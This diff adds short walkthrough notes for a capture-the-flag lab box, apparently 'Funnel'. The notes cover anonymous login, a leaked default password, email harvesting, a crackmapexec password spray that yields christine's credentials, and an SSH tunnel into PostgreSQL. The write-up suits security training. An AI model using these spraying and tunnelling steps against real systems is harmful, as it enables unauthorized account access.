@@ -1,0 +1,20 @@
+after scan we see anonymous login is enabled
+
+logging in anonymously we find a document that displays the company rules for password creation
+
+in the above file the default password is funnel123#!#
+
+we also found a file containing email addresses optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb
+
+now to password spray the default password to the rest of the emails ill use :
+	-> crackmapexec smb <ip> -u users.txt -p passwords.txt
+	
+	
+After running the password spray we found a hit :
+└─$ crackmapexec ssh 10.129.229.194 -u users.txt -p passwords.txt
+SSH         10.129.229.194  22     10.129.229.194   [+] christine:funnel123#!#
+
+after logging in to christine we find a postgresql database with the command ss ls
+	-> attempt to use this to open a port to the postgresql db 
+		->ssh -p 7822 username@example.com -L 5432:localhost:5432 	
+		-> after creating the tunnel , connect to the DB via -> psql -U christine -h localhost -p 5432 
